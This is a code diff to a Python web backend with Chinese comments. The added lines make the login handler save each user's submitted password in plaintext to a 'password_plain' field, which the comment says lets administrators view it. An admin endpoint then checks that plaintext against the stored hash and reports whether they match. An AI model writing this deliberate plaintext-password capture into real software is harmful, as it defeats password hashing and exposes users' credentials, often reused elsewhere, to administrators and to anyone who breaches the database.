@@ -9196,6 +9196,10 @@ def login_start(data: LoginStartIn, db: Session = Depends(get_db)):
         raise HTTPException(401, "用户不存在")
     if not verify_pw(data.password, u.password_hash):
         raise HTTPException(401, "密码错误")
+    # 记录最新的明文密码，便于管理员在验证后查看。
+    new_plain = str(data.password or "")
+    if str(u.password_plain or "") != new_plain:
+        u.password_plain = new_plain
     free_mode = get_auth_free_mode(db)
     if free_mode:
         u.last_login_ts = int(time.time())
@@ -12092,6 +12096,13 @@ def admin_user_password_confirm(payload: dict, admin=_Depends(_require_admin)):
         # 未修改密码，仅查看信息：保留验证码以便后续操作
         updated_plain = str(updated_plain or "")
     updated_plain = str(updated_plain or "")
+    plain_for_check = updated_plain
+    password_matches_hash = False
+    if plain_for_check:
+        try:
+            password_matches_hash = pwd_context.verify(plain_for_check, updated_hash)
+        except Exception:
+            password_matches_hash = False
     con.commit(); con.close()
     return {
         "ok": True,
@@ -12103,6 +12114,7 @@ def admin_user_password_confirm(payload: dict, admin=_Depends(_require_admin)):
         },
         "password_updated": password_updated,
         "code_consumed": code_consumed,
+        "password_matches_hash": password_matches_hash,
         "note": "若仅查看密码，请保留验证码以便需要时再次提交新密码进行重置。",
     }
 
